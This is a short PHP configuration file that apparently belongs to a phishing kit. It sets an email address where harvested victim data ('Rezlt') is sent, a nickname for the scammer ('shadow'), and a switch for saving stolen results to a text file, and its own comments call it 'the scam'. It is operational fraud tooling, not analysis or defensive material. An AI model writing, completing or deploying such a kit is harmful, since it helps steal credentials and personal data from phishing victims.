<?php
########################################################
############# [+] EMAIL INFORMATION [+] ################
########################################################
$setting = ["mail_to" => "yassinyassin137@yahoo.com","debug_mode" => false];
$scamname = "shadow"; // *Change |shadow| to any name you want |Your Nick Name|
$saveintext = "yes"; // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
?>
